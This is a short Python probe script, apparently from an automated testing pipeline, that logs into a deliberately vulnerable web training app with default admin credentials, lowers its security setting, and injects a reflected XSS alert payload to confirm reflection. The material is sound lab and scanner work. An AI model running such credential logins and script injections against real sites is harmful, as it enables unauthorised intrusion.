#!/usr/bin/env python3
"""Reflected XSS probe for /vulnerabilities/xss_r/ — Brain Engine v1"""
import requests, re, sys
B = 'http://172.17.0.1:3100'
marker = sys.argv[1] if len(sys.argv) > 1 else 'PBRN7719'
s = requests.Session()
# Login
r = s.get(B + '/login.php', timeout=10)
t = re.search(r"name='user_token' value='([^']+)'", r.text)
tok = t.group(1) if t else ''
s.post(B + '/login.php', data={'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': tok}, timeout=10)
# Security low
r = s.get(B + '/security.php', timeout=10)
t = re.search(r"name='user_token' value='([^']+)'", r.text)
tok2 = t.group(1) if t else ''
s.post(B + '/security.php', data={'security': 'low', 'seclev_submit': 'Submit', 'user_token': tok2}, timeout=10)
# Inject reflected XSS
payload = f"<script>alert('{marker}')</script>"
r = s.get(B + f'/vulnerabilities/xss_r/?name={payload}', timeout=10)
reflected = marker in r.text
print(f"MARKER: {marker}")
print(f"REFLECTED: {reflected}")
print(f"STATUS: {r.status_code}")
if reflected:
    # Rule #49: the pipeline's interestingness gate reads the probe's own
    # stdout — print the signal-bearing evidence (the actual reflected
    # payload), not just the verdict label.
    print(f"EVIDENCE: reflected payload {payload} in HTTP response")
    print(f"VERDICT: CONFIRMED")
else:
    print(f"VERDICT: FAILED")
